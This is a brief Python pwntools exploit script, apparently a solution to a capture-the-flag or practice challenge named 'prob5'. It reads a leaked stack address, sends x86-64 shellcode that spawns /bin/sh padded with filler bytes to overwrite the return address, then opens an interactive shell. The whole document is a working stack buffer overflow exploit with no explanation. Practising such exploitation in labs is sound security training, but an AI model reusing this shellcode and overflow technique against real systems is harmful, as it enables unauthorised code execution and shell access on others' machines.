from pwn import *

p = process("./prob5")

p.recvuntil(": ")
buf = int(p.recv(14),16)

p.recvuntil(": ")

payload = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload += "A" * (264 - len(payload))
payload += p64(buf)

p.sendline(payload)

p.interactive()